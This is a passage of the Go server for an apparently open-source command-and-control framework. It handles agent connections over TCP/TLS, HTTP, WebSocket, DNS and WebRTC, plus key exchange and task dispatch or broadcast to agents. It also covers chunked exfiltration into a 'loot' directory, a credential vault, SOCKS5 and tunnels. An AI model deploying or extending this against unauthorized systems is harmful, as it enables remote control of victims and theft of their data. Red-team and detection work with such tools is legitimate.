package c2

import (
	"context"
	"crypto/ecdsa"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/auth"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/c2/session"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/config"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/crypto"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/db"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/logger"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/module"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/proto"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/reporting"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/siem"
	"github.com/Ruby570bocadito/WorldC2/src/go/internal/transport"
	"golang.org/x/crypto/hkdf"
	protobuf "google.golang.org/protobuf/proto"
)

// Server is the main C2 server.
type Server struct {
	cfg       *config.Config
	db        *db.DB
	tlsCert   tls.Certificate
	tlsConfig *tls.Config
	sessions  sync.Map

	// JWT authentication
	tokenManager *auth.TokenManager

	// RBAC
	rbac *auth.RBAC

	// Structured logger
	log *logger.Logger

	// mTLS
	caCert      *x509.Certificate
	caKey       *ecdsa.PrivateKey
	mtlsEnabled bool

	// Multi-transport listeners
	listeners []net.Listener

	// Operational features
	socks5      *SOCKS5Manager
	vault       *CredentialVault
	files       *FileManager
	exfil       *ExfilAssembler
	portFwds    *PortFwdManager
	tunnels     *TunnelManager
	moduleStore *module.Store
	reporter    *reporting.ReportGenerator
	siem        *siem.SIEMForwarder

	// API server for graceful shutdown
	apiServer *http.Server
	apiMux    *http.ServeMux

	quit chan struct{}
	wg   sync.WaitGroup
	// acceptWG tracks the per-listener accept-loop goroutines only. Stop()
	// waits for it BEFORE waiting on wg: that guarantees no accept-loop is
	// still alive (and thus able to call wg.Add(1) for a freshly accepted
	// connection) while wg.Wait() runs — the old ordering could panic with
	// "sync: WaitGroup misuse: Add called concurrently with Wait".
	acceptWG sync.WaitGroup

	// admitMu serializes session admission: the max_sessions count and the
	// sessions.Store happen under one critical section, so N simultaneous
	// connections cannot all slip past the cap (TOCTOU).
	admitMu sync.Mutex

	// startTime records when the server was created (for uptime reporting).
	startTime time.Time
}

// SetAPIMux sets a custom API mux (used to avoid circular imports).
func (s *Server) SetAPIMux(mux *http.ServeMux) { s.apiMux = mux }

// applyTLSMinVersion sets the minimum TLS version from config ("1.2" or
// "1.3"). Only explicit configuration overrides the built-in defaults so
// the mTLS profile keeps its own floor when tls.min_version is unset.
func applyTLSMinVersion(c *tls.Config, v string) {
	switch v {
	case "1.3":
		c.MinVersion = tls.VersionTLS13
	case "1.2":
		c.MinVersion = tls.VersionTLS12
	default:
		log.Printf("[TLS] Unsupported tls.min_version %q (use \"1.2\" or \"1.3\") — keeping current floor", v)
	}
}

// loadOrCreateCA loads the persisted mTLS CA from the secrets store, or
// creates and persists a new one on first start. Regenerating the CA on
// every boot (the old behavior) silently invalidated any client
// certificates that had been issued.
func loadOrCreateCA(database *db.DB) (*x509.Certificate, *ecdsa.PrivateKey, error) {
	certPEM, cerr := database.GetSecret("mtls_ca_cert")
	keyPEM, kerr := database.GetSecret("mtls_ca_key")
	if cerr == nil && kerr == nil && len(certPEM) > 0 && len(keyPEM) > 0 {
		cert, key, perr := crypto.ParseCA(certPEM, keyPEM)
		if perr == nil {
			log.Println("[MTLS] Loaded persisted CA certificate")
			return cert, key, nil
		}
		log.Printf("[MTLS] Persisted CA unreadable (%v) — generating a new one", perr)
	}
	cert, key, err := crypto.GenerateCA()
	if err != nil {
		return nil, nil, err
	}
	certPEM, keyPEM, err = crypto.MarshalCA(cert, key)
	if err != nil {
		return nil, nil, err
	}
	if err := database.SetSecret("mtls_ca_cert", certPEM); err != nil {
		return nil, nil, err
	}
	if err := database.SetSecret("mtls_ca_key", keyPEM); err != nil {
		return nil, nil, err
	}
	log.Println("[MTLS] Generated and persisted new CA certificate")
	return cert, key, nil
}

// mustRandom returns n cryptographically secure random bytes or panics.
// Silent zero-filled keys would be catastrophic (forgeable HMACs, guessable
// secrets), so a crypto/rand failure is treated as fatal.
func mustRandom(n int) []byte {
	b := make([]byte, n)
	if _, err := io.ReadFull(rand.Reader, b); err != nil {
		panic(fmt.Sprintf("crypto/rand unavailable: %v", err))
	}
	return b
}

// buildLogger honours the logging section of the config (level and optional
// file output). WORLDC2_LOG_LEVEL overrides the configured level so container
// deployments can tune verbosity without touching the YAML.
func buildLogger(cfg config.LoggingConfig) *logger.Logger {
	level := logger.INFO
	if cfg.Level != "" {
		if parsed, err := logger.ParseLevel(cfg.Level); err == nil {
			level = parsed
		} else {
			log.Printf("[LOG] Unknown logging.level %q — using info", cfg.Level)
		}
	}
	if env := os.Getenv("WORLDC2_LOG_LEVEL"); env != "" {
		if parsed, err := logger.ParseLevel(env); err == nil {
			level = parsed
		} else {
			log.Printf("[LOG] Unknown WORLDC2_LOG_LEVEL %q — ignoring", env)
		}
	}
	l := logger.New(level, true)
	if cfg.Output == "file" && cfg.File != "" {
		f, err := os.OpenFile(cfg.File, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
		if err != nil {
			log.Printf("[LOG] Cannot open log file %s: %v — logging to stderr only", cfg.File, err)
			return l
		}
		l.AddOutput(f)
		log.Printf("[LOG] Logging to %s", cfg.File)
	}
	return l
}

// New creates a new C2 server.
func New(cfg *config.Config, database *db.DB) *Server {
	// Load or create persistent JWT secret
	jwtSecret, err := database.GetSecret("jwt_signing_key")
	if err != nil {
		// Generate new secret and persist it
		jwtSecret = mustRandom(32)
		if serr := database.SetSecret("jwt_signing_key", jwtSecret); serr != nil {
			log.Printf("[AUTH] WARNING: could not persist JWT signing key: %v", serr)
		}
		log.Println("[AUTH] Generated new JWT signing key")
	} else {
		log.Println("[AUTH] Loaded existing JWT signing key")
	}

	// Derive a stable module-signing key from the persisted JWT secret
	// (HKDF with a distinct info string — same root key, unrelated output
	// domain). Deriving instead of generating randomly keeps module HMAC
	// signatures verifiable across server restarts.
	hkdfReader := hkdf.New(sha256.New, jwtSecret, nil, []byte("worldc2-module-signing-key"))
	moduleHMACKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdfReader, moduleHMACKey); err != nil {
		panic(fmt.Sprintf("derive module signing key: %v", err))
	}

	// Initialize mTLS CA — generated once and persisted in the secrets
	// store, so issued client certificates remain valid across restarts.
	var caCert *x509.Certificate
	var caKey *ecdsa.PrivateKey
	caCert, caKey, err = loadOrCreateCA(database)
	mtlsEnabled := false
	if err != nil {
		log.Printf("[MTLS] Warning: failed to initialize CA: %v", err)
	} else {
		mtlsEnabled = true
		log.Println("[MTLS] CA certificate ready")
	}

	return &Server{
		cfg:          cfg,
		db:           database,
		tokenManager: auth.NewTokenManager(jwtSecret, 12*time.Hour),
		rbac:         auth.NewRBAC(),
		log:          buildLogger(cfg.Logging),
		caCert:       caCert,
		caKey:        caKey,
		mtlsEnabled:  mtlsEnabled,
		socks5:       NewSOCKS5Manager(),
		vault:        NewCredentialVault(database),
		files:        NewFileManager("loot"),
		portFwds:     NewPortFwdManager(),
		tunnels:      NewTunnelManager(),
		moduleStore:  module.NewStore("modules", moduleHMACKey),
		reporter:     reporting.NewReportGenerator("reports"),
		siem:         siem.NewSIEMForwarder(1024),
		apiServer:    nil,
		quit:         make(chan struct{}),
		startTime:    time.Now(),
	}
}

// Start begins listening on all configured transports.
func (s *Server) Start() error {
	// Tunnel reaper: closes tunnels whose session died or that have been
	// idle beyond tunnelIdleTimeout, so the tunnels map cannot grow
	// without bound during long missions. Runs for the server lifetime.
	s.tunnels.StartReaper(s.quit)

	// Exfil chunked-upload assembler. Resume requests are delivered to
	// the agent as tasks (__exfil_resume) through the normal task queue.
	// CreateTask BLOCKS until the task result arrives, so it must never
	// run on the session read loop: the reader would stop consuming the
	// very chunks the resume is supposed to receive (deadlock until the
	// 300s task timeout). Fire it on its own goroutine instead.
	s.exfil = NewExfilAssembler("loot", s.files, func(sessionID, transferID string, offset int64) {
		go func() {
			if _, err := s.CreateTask(sessionID, fmt.Sprintf("__exfil_resume %s %d", transferID, offset), 300); err != nil {
				log.Printf("[EXFIL] cannot enqueue resume for %s: %v", transferID, err)
			}
		}()
	})

	// Configure TLS. Fail hard instead of silently falling back to
	// plaintext when the operator asked for TLS but no certificate is
	// available.
	if s.cfg.TLS.Enabled {
		var cert tls.Certificate
		switch {
		case s.cfg.TLS.CertFile != "" && s.cfg.TLS.KeyFile != "":
			var err error
			cert, err = tls.LoadX509KeyPair(s.cfg.TLS.CertFile, s.cfg.TLS.KeyFile)
			if err != nil {
				return fmt.Errorf("load TLS cert/key: %w", err)
			}
			s.tlsCert = cert
			log.Printf("[TLS] Loaded certificate from %s", s.cfg.TLS.CertFile)
		case s.cfg.TLS.AutoCert:
			var err error
			cert, err = transport.GenerateSelfSignedCert(s.cfg.Server.Host)
			if err != nil {
				return fmt.Errorf("generate TLS cert: %w", err)
			}
			s.tlsCert = cert
		default:
			return fmt.Errorf("tls.enabled=true but no certificate configured: set tls.auto_cert=true or tls.cert_file/tls.key_file")
		}

		// Optional mutual TLS (tls.mtls: true): agents must present a
		// client certificate issued via POST /api/mtls/cert and load it
		// with worldc2-agent -tls-cert/-tls-key. Off by default — with
		// no cert loaded the agent handshake can never complete.
		if s.mtlsEnabled && s.cfg.TLS.MTLS {
			s.tlsConfig = crypto.NewMTLSServerConfig(cert, s.caCert)
			log.Printf("[MTLS] Mutual TLS enforced — agents require issued client certificates")
		} else if s.cfg.TLS.CertFile != "" && s.cfg.TLS.KeyFile != "" {
			s.tlsConfig = &tls.Config{
				Certificates: []tls.Certificate{cert},
				MinVersion:   tls.VersionTLS12,
			}
		} else {
			s.tlsConfig = transport.NewTLSConfig(cert)
		}

		if s.tlsConfig != nil && s.cfg.TLS.MinVersion != "" {
			applyTLSMinVersion(s.tlsConfig, s.cfg.TLS.MinVersion)
		}
	}

	// Start REST API using modular handlers. Bind synchronously so a
	// busy port fails fast with a clear error instead of leaving the
	// server running without a control API.
	apiMux := s.setupAPI()
	apiAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.API.Port)
	apiLn, err := net.Listen("tcp", apiAddr)
	if err != nil {
		return fmt.Errorf("API listen on %s: %w", apiAddr, err)
	}
	apiServer := &http.Server{
		Handler:           apiMux,
		ReadHeaderTimeout: 10 * time.Second,
		ReadTimeout:       60 * time.Second,
		WriteTimeout:      120 * time.Second,
		IdleTimeout:       120 * time.Second,
	}
	s.apiServer = apiServer

	go func() {
		log.Printf("[API] Listening on %s", apiAddr)
		if err := apiServer.Serve(apiLn); err != nil && err != http.ErrServerClosed {
			log.Printf("[API] Error: %v", err)
		}
	}()

	// Start TCP/TLS C2 listener
	tcpAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Server.Port)

	if s.cfg.TLS.Enabled && s.tlsConfig != nil {
		tcpListener, err := tls.Listen("tcp", tcpAddr, s.tlsConfig)
		if err != nil {
			return fmt.Errorf("TCP listen: %w", err)
		}
		log.Printf("[TCP+TLS] Listening on %s", tcpAddr)
		s.listeners = append(s.listeners, tcpListener)
		s.acceptWG.Add(1)
		go s.acceptLoop(tcpListener, "tcp")
	} else {
		if s.cfg.TLS.Enabled {
			log.Printf("[TCP] WARNING: tls.enabled=true but no TLS config could be built — listening in PLAINTEXT on %s", tcpAddr)
		}
		tcpListener, err := net.Listen("tcp", tcpAddr)
		if err != nil {
			return fmt.Errorf("TCP listen: %w", err)
		}
		log.Printf("[TCP] Listening on %s", tcpAddr)
		s.listeners = append(s.listeners, tcpListener)
		s.acceptWG.Add(1)
		go s.acceptLoop(tcpListener, "tcp")
	}
	// Start HTTPS long-poll listener
	httpAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.HTTPPort)
	var httpListener *transport.HTTPListener

	if s.cfg.TLS.Enabled && s.tlsConfig != nil {
		httpListener = transport.NewHTTPSListener(httpAddr, s.tlsConfig)
	} else {
		httpListener = transport.NewHTTPListener(httpAddr)
	}

	if err := httpListener.Start(); err != nil {
		log.Printf("[HTTP] Warning: failed to start: %v", err)
	} else {
		s.listeners = append(s.listeners, httpListener)
		s.acceptWG.Add(1)
		go s.acceptLoop(httpListener, "http")
	}

	// Start WebSocket listener
	wsAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.WSPort)
	var wsListener *transport.WSListener

	if s.cfg.TLS.Enabled && s.tlsConfig != nil {
		wsListener = transport.NewWSSListener(wsAddr, s.tlsConfig)
	} else {
		wsListener = transport.NewWSListener(wsAddr)
	}

	if err := wsListener.Start(); err != nil {
		log.Printf("[WS] Warning: failed to start: %v", err)
	} else {
		s.listeners = append(s.listeners, wsListener)
		s.acceptWG.Add(1)
		go s.acceptLoop(wsListener, "ws")
	}

	// Start DNS listener if configured
	if s.cfg.Transport.DNSPort > 0 {
		dnsAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.DNSPort)
		dnsListener, err := transport.NewDNSListener(dnsAddr, s.cfg.Transport.DNSDomains, nil)
		if err != nil {
			log.Printf("[DNS] Warning: failed to start: %v", err)
		} else {
			dnsListener.Start()
			s.listeners = append(s.listeners, dnsListener)
			s.acceptWG.Add(1)
			go s.acceptLoop(dnsListener, "dns")
		}
	}

	// Start WebRTC listener (signaling HTTP endpoint + data channels)
	if s.cfg.Transport.WebRTCPort > 0 {
		webrtcAddr := fmt.Sprintf("%s:%d", s.cfg.Server.Host, s.cfg.Transport.WebRTCPort)
		webrtcListener, err := transport.NewWebRTCListener(webrtcAddr, s.tlsConfig)
		if err != nil {
			log.Printf("[WEBRTC] Warning: failed to start: %v", err)
		} else {
			s.listeners = append(s.listeners, webrtcListener)
			s.acceptWG.Add(1)
			go s.acceptLoop(webrtcListener, "webrtc")
			log.Printf("[WEBRTC] Signaling listening on %s", webrtcAddr)
		}
	}

	// Session cleanup goroutine
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		s.cleanupStaleSessions()
	}()

	return nil
}

func (s *Server) acceptLoop(listener net.Listener, transportName string) {
	defer s.acceptWG.Done()

	backoff := 100 * time.Millisecond
	for {
		select {
		case <-s.quit:
			return
		default:
		}

		conn, err := listener.Accept()
		if err != nil {
			select {
			case <-s.quit:
				return
			default:
				// A broken-but-open listener would spin at 100%% CPU;
				// back off and keep retrying until quit.
				time.Sleep(backoff)
				if backoff < time.Second {
					backoff *= 2
				}
				continue
			}
		}
		backoff = 100 * time.Millisecond

		s.wg.Add(1)
		go func() {
			defer s.wg.Done()
			s.handleConnection(conn, transportName)
		}()
	}
}

// Stop gracefully shuts down the server with a 30-second timeout.
func (s *Server) Stop() {
	log.Println("[C2] Shutting down all listeners...")
	close(s.quit)

	// Create a context with timeout for graceful shutdown
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Flush and stop SIEM forwarder
	if s.siem != nil {
		s.siem.Stop()
	}

	// Shutdown API server gracefully with context
	if s.apiServer != nil {
		s.apiServer.Shutdown(ctx)
	}

	// Close all listeners first, then wait for the accept-loops to notice
	// and exit. Only after that is it safe to wait on wg: every potential
	// wg.Add(1) for a connection handler has already happened.
	for _, ln := range s.listeners {
		ln.Close()
	}
	s.acceptWG.Wait()

	// Clean up sessions without ranging while they're being modified
	s.sessions.Range(func(key, value interface{}) bool {
		if sess, ok := value.(*session.Session); ok {
			sess.Close()
		}
		return true
	})

	s.wg.Wait()
	log.Println("[C2] Server stopped")
}

// Accessors for modular handlers.

// Quit returns the quit channel for shutdown signaling.
func (s *Server) Quit() <-chan struct{} { return s.quit }

// TokenManager returns the JWT token manager.
func (s *Server) TokenManager() *auth.TokenManager { return s.tokenManager }

// RBAC returns the RBAC manager.
func (s *Server) RBAC() *auth.RBAC { return s.rbac }

// DB returns the database handle.
func (s *Server) DB() *db.DB { return s.db }

// SIEM returns the SIEM forwarder.
func (s *Server) SIEM() *siem.SIEMForwarder { return s.siem }

// ListenerCount returns the number of active listeners.
func (s *Server) ListenerCount() int { return len(s.listeners) }

// UptimeSeconds returns seconds elapsed since the server was created.
func (s *Server) UptimeSeconds() int64 { return int64(time.Since(s.startTime).Seconds()) }

// ModuleStore returns the module store.
func (s *Server) ModuleStore() *module.Store { return s.moduleStore }

// Sessions returns the sessions map.
func (s *Server) Sessions() *sync.Map { return &s.sessions }

// SOCKS5 returns the SOCKS5 manager.
func (s *Server) SOCKS5() *SOCKS5Manager { return s.socks5 }

// Vault returns the credential vault.
func (s *Server) Vault() *CredentialVault { return s.vault }

// Files returns the file manager.
func (s *Server) Files() *FileManager { return s.files }

// PortFwds returns the port forwarding manager.
func (s *Server) PortFwds() *PortFwdManager { return s.portFwds }

// Tunnels returns the tunnel manager.
func (s *Server) Tunnels() *TunnelManager { return s.tunnels }

// Reporter returns the report generator.
func (s *Server) Reporter() *reporting.ReportGenerator { return s.reporter }

// MTLSEnabled returns whether mTLS is enabled.
func (s *Server) MTLSEnabled() bool { return s.mtlsEnabled }

// CACert returns the CA certificate.
func (s *Server) CACert() *x509.Certificate { return s.caCert }

// CAKey returns the CA private key.
func (s *Server) CAKey() *ecdsa.PrivateKey { return s.caKey }

// Config returns the server configuration.
func (s *Server) Config() *config.Config { return s.cfg }

// CreateTask sends a command to an agent.
func (s *Server) CreateTask(agentID, command string, timeoutSec uint32) (*proto.TaskResult, error) {
	var sess *session.Session

	if val, ok := s.sessions.Load(agentID); ok {
		sess = val.(*session.Session)
	} else {
		s.sessions.Range(func(k, v interface{}) bool {
			s := v.(*session.Session)
			if s.AgentID == agentID || s.Hostname == agentID || s.ID == agentID {
				sess = s
				return false
			}
			return true
		})
	}

	if sess == nil {
		return nil, fmt.Errorf("agent not found: %s", agentID)
	}
	if !sess.IsActive() {
		return nil, fmt.Errorf("agent not active")
	}

	taskID := generateTaskID()
	task := &proto.Task{TaskId: taskID, Command: command, TimeoutSec: timeoutSec}

	s.db.InsertTask(&db.TaskRecord{
		ID: taskID, SessionID: sess.ID, Command: command, IssuedAt: time.Now(),
	})
	s.db.LogAction(0, "task", fmt.Sprintf("%s: %s", sess.Hostname, command))

	resultCh := sess.RegisterPendingTask(taskID)
	if err := sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_TASK, task); err != nil {
		sess.ResolveTask(taskID, nil)
		return nil, fmt.Errorf("send: %w", err)
	}

	timeout := time.Duration(timeoutSec) * time.Second
	if timeout == 0 {
		timeout = 30 * time.Second
	}

	select {
	case result, ok := <-resultCh:
		if !ok {
			// Session closed while the task was pending: the
			// channel delivers the zero value with ok=false.
			return nil, fmt.Errorf("session closed before task completed")
		}
		if result != nil {
			s.db.UpdateTaskResult(taskID, result.Output, int(result.ExitCode), result.Success)
		}
		return result, nil
	case <-sess.Done():
		return nil, fmt.Errorf("session closed before task completed")
	case <-time.After(timeout):
		sess.ResolveTask(taskID, nil)
		s.db.UpdateTaskResult(taskID, "timeout", -1, false)
		return nil, fmt.Errorf("task timed out")
	}
}

// BroadcastTask sends a command to all active sessions.
func (s *Server) BroadcastTask(command string) map[string]*proto.TaskResult {
	results := make(map[string]*proto.TaskResult)
	var mu sync.Mutex
	var wg sync.WaitGroup

	s.sessions.Range(func(key, value interface{}) bool {
		sess := value.(*session.Session)
		if !sess.IsActive() {
			return true
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			result, err := s.CreateTask(sess.ID, command, 30)
			mu.Lock()
			if err != nil {
				results[sess.ID] = &proto.TaskResult{TaskId: sess.ID, Success: false, ErrorMessage: err.Error()}
			} else {
				results[sess.ID] = result
			}
			mu.Unlock()
		}()
		return true
	})

	wg.Wait()
	return results
}

// ActiveSessions returns the count of active sessions.
func (s *Server) ActiveSessions() int {
	count := 0
	s.sessions.Range(func(key, value interface{}) bool {
		if value.(*session.Session).IsActive() {
			count++
		}
		return true
	})
	return count
}

// resolveSession finds a session by map key, agent ID, hostname or session ID.
// Live sessions are preferred over stale ones from previous connections.
func (s *Server) resolveSession(agentID string) *session.Session {
	if val, ok := s.sessions.Load(agentID); ok {
		return val.(*session.Session)
	}
	var live, fallback *session.Session
	s.sessions.Range(func(k, v interface{}) bool {
		sess := v.(*session.Session)
		if sess.AgentID == agentID || sess.Hostname == agentID || sess.ID == agentID {
			if sess.IsActive() && live == nil {
				live = sess
				return false
			}
			if fallback == nil {
				fallback = sess
			}
		}
		return true
	})
	if live != nil {
		return live
	}
	return fallback
}

// KillAgent kills a specific agent session.
func (s *Server) KillAgent(agentID string) error {
	sess := s.resolveSession(agentID)
	if sess == nil {
		return fmt.Errorf("agent not found")
	}
	sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_DISCONNECT, nil)
	sess.SetState(session.StateKilled)
	sess.Close()
	s.db.UpdateSessionState(sess.ID, "killed")
	s.sessions.Delete(sess.ID)

	s.siem.Forward(siem.SIEMEvent{
		EventType: "agent_killed",
		Source:    "c2_server",
		Data: map[string]interface{}{
			"session_id": sess.ID,
			"agent_id":   sess.AgentID,
			"hostname":   sess.Hostname,
		},
	})

	return nil
}

// --- Connection handler ---

func (s *Server) handleConnection(conn net.Conn, transportName string) {
	defer conn.Close()

	remoteAddr := conn.RemoteAddr().String()

	// Read first 4 bytes to validate protocol (length-prefixed message)
	peek := make([]byte, 4)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	n, err := conn.Read(peek)
	conn.SetReadDeadline(time.Time{})

	// Reject non-WORLDC2 protocol connections (browsers, scanners, TLS handshakes)
	if err != nil || n < 4 || peek[0] == 0x16 || peek[0] == 0x47 || peek[0] == 0x50 {
		if peek[0] == 0x16 {
			// TLS ClientHello — silently drop
			return
		}
		return
	}

	// Validate length prefix is reasonable (1 byte to 100 MB)
	msgLen := binary.BigEndian.Uint32(peek)
	if msgLen < 10 || msgLen > 100*1024*1024 {
		return
	}

	// Prepend peek bytes back for the session reader
	conn = &peekConn{Conn: conn, peek: peek[:n]}

	log.Printf("[C2/%s] New connection from %s", transportName, remoteAddr)

	sess := session.NewSession(conn, transportName)
	sess.SetState(session.StateKeyExchange)

	if err := s.handleKeyExchange(sess); err != nil {
		log.Printf("[C2/%s] Key exchange failed: %v", transportName, err)
		return
	}

	if err := s.handleSessionInit(sess); err != nil {
		log.Printf("[C2/%s] Session init failed: %v", transportName, err)
		return
	}

	log.Printf("[C2/%s] Session established: %s (%s@%s)",
		transportName, sess.ID, sess.Username, sess.Hostname)

	// Enforce the configured session cap BEFORE any persistence so a
	// rejected connection never leaves an orphaned "active" row behind.
	// Count+Store run under admitMu to close the TOCTOU window.
	if s.cfg.Server.MaxSessions > 0 {
		s.admitMu.Lock()
		count := 0
		s.sessions.Range(func(_, _ interface{}) bool { count++; return true })
		if count >= int(s.cfg.Server.MaxSessions) {
			s.admitMu.Unlock()
			log.Printf("[C2/%s] Rejected session from %s: max_sessions (%d) reached",
				transportName, remoteAddr, s.cfg.Server.MaxSessions)
			sess.Close()
			return
		}
		s.sessions.Store(sess.ID, sess)
		s.admitMu.Unlock()
	} else {
		s.sessions.Store(sess.ID, sess)
	}

	sess.SetState(session.StateActive)

	// Tie the session lifetime to its tunnels: when this session closes,
	// every tunnel it carries is torn down locally (tunnel reaper).
	s.tunnels.WatchSession(sess)

	s.db.UpsertSession(&db.SessionRecord{
		ID: sess.ID, AgentID: sess.AgentID, Hostname: sess.Hostname,
		OS: sess.OS, Arch: sess.Arch, Username: sess.Username,
		IsAdmin: sess.IsAdmin, State: "active", LastSeen: time.Now(),
	})
	s.db.LogAction(0, "session", fmt.Sprintf("%s via %s", sess.Hostname, transportName))

	// Forward session establishment to SIEM
	s.siem.Forward(siem.SIEMEvent{
		EventType: "session_established",
		Source:    "c2_server",
		Data: map[string]interface{}{
			"session_id": sess.ID,
			"agent_id":   sess.AgentID,
			"hostname":   sess.Hostname,
			"os":         sess.OS,
			"arch":       sess.Arch,
			"username":   sess.Username,
			"is_admin":   sess.IsAdmin,
			"transport":  transportName,
		},
	})

	s.handleMessageLoop(sess)

	// Remove the session from the map so dead entries never accumulate
	// and task routing never resolves a stale session.
	if cur, ok := s.sessions.Load(sess.ID); ok && cur == interface{}(sess) {
		s.sessions.Delete(sess.ID)
	}
	s.db.UpdateSessionState(sess.ID, "disconnected")
	log.Printf("[C2/%s] Session ended: %s", transportName, sess.ID)
}

func (s *Server) handleKeyExchange(sess *session.Session) error {
	serverKP, err := crypto.GenerateKeyPair()
	if err != nil {
		return fmt.Errorf("keypair: %w", err)
	}
	sess.KeyPair = serverKP

	inner, err := sess.RecvRaw()
	if err != nil {
		return fmt.Errorf("recv: %w", err)
	}

	if inner.Type != proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE {
		return fmt.Errorf("expected KEY_EXCHANGE")
	}

	agentKE := inner.GetKeyExchange()
	if len(agentKE.PublicKey) != crypto.KeySize {
		return fmt.Errorf("invalid key size")
	}

	var agentPub [crypto.KeySize]byte
	copy(agentPub[:], agentKE.PublicKey)

	shared, err := crypto.DeriveSharedSecret(&serverKP.PrivateKey, &agentPub)
	if err != nil {
		return fmt.Errorf("shared secret: %w", err)
	}

	salt, _ := crypto.GenerateSalt()
	encKey, hmacKey, sessionToken, err := crypto.DeriveSessionKeys(shared, salt)
	if err != nil {
		return fmt.Errorf("derive keys: %w", err)
	}

	sess.EncKey = encKey
	sess.HmacKey = hmacKey
	sess.SessionToken = sessionToken

	serverInner := &proto.EnvelopeInner{
		Id:        2,
		Type:      proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
		Timestamp: uint64(time.Now().UnixNano()),
		Payload: &proto.EnvelopeInner_KeyExchange{KeyExchange: &proto.KeyExchange{
			PublicKey: serverKP.PublicKey[:], Padding: salt,
		}},
	}
	innerBytes, _ := protobuf.Marshal(serverInner)

	return sess.SendRaw(&proto.Envelope{
		Id: 2, Type: proto.EnvelopeType_ENVELOPE_TYPE_KEY_EXCHANGE,
		Timestamp:  serverInner.Timestamp,
		Nonce:      make([]byte, crypto.NonceSize),
		Ciphertext: innerBytes,
	})
}

func (s *Server) handleSessionInit(sess *session.Session) error {
	inner, err := sess.RecvRaw()
	if err != nil {
		return fmt.Errorf("recv: %w", err)
	}

	if inner.Type != proto.EnvelopeType_ENVELOPE_TYPE_SESSION_INIT {
		return fmt.Errorf("expected SESSION_INIT")
	}

	init := inner.GetSessionInit()
	sess.Hostname = init.Hostname
	sess.OS = init.Os
	sess.Arch = init.Arch
	sess.Username = init.Username
	sess.IsAdmin = init.IsAdmin
	sess.AgentID = init.AgentId
	sess.AgentVersion = init.AgentVersion

	ack := &proto.Acknowledge{AckId: inner.Id, Success: true}
	return sess.SendEnvelope(proto.EnvelopeType_ENVELOPE_TYPE_ACK, ack)
}

func (s *Server) handleMessageLoop(sess *session.Session) {
	for {
		select {
		case <-s.quit:
			return
		default:
		}

		inner, err := sess.RecvEnvelope()
		if err != nil {
			log.Printf("[C2] Session %s read error: %v", sess.ID, err)
			s.siem.Forward(siem.SIEMEvent{
				EventType: "session_error",
				Source:    "c2_server",
				Data:      map[string]interface{}{"session_id": sess.ID, "error": err.Error()},
			})
			sess.Close()
			return
		}

		switch inner.Type {
		case proto.EnvelopeType_ENVELOPE_TYPE_HEARTBEAT:
			sess.Touch()
			// Debounce: one DB write per agent per minute at most.
			if sess.ShouldUpdateDB(time.Minute) {
				s.db.UpdateSessionLastSeen(sess.ID)
			}

		case proto.EnvelopeType_ENVELOPE_TYPE_TASK_RESULT:
			if result := inner.GetTaskResult(); result != nil {
				// Check for tunnel results
				if strings.HasPrefix(result.Output, "tunnel_") {
					s.tunnels.HandleTunnelResult(result)
				}
				// Chunked file exfiltration (assembly + resume)
				if s.exfil != nil {
					s.exfil.HandleOutput(sess.ID, result.Output)
				}
				sess.ResolveTask(result.TaskId, result)

				// Forward task result to SIEM
				s.siem.Forward(siem.SIEMEvent{
					EventType: "task_result",
					Source:    "c2_server",
					Data: map[string]interface{}{
						"session_id": sess.ID,
						"task_id":    result.TaskId,
						"success":    result.Success,
						"exit_code":  result.ExitCode,
					},
				})
			}

		case proto.EnvelopeType_ENVELOPE_TYPE_RECONNECT:
			sess.SetState(session.StatePassive)
			s.db.UpdateSessionState(sess.ID, "passive")
			s.siem.Forward(siem.SIEMEvent{
				EventType: "session_passive",
				Source:    "c2_server",
				Data:      map[string]interface{}{"session_id": sess.ID},
			})

		case proto.EnvelopeType_ENVELOPE_TYPE_DISCONNECT:
			s.siem.Forward(siem.SIEMEvent{
				EventType: "session_disconnect",
				Source:    "c2_server",
				Data:      map[string]interface{}{"session_id": sess.ID},
			})
			sess.Close()
			return
		}
	}
}

func (s *Server) cleanupStaleSessions() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-s.quit:
			return
		case <-ticker.C:
			s.sessions.Range(func(key, value interface{}) bool {
				sess := value.(*session.Session)
				if sess.IsStale(s.cfg.Server.SessionTimeout) {
					sess.Close()
					// Drop the dead entry so the map does not
					// grow without bound and lookups cannot
					// resolve a stale session for an agent ID.
					if cur, ok := s.sessions.Load(key); ok && cur == value {
						s.sessions.Delete(key)
					}
				}
				return true
			})
		}
	}
}

// --- REST API ---

func (s *Server) setupAPI() *http.ServeMux {
	// Use externally-configured API mux (set via SetAPIMux from cmd/server/main.go)
	// to avoid circular imports between c2 <-> handlers packages.
	mux := s.apiMux
	if mux == nil {
		mux = http.NewServeMux()
	}

	// Serve SPA frontend from web/dist/ if it exists. When the mux was
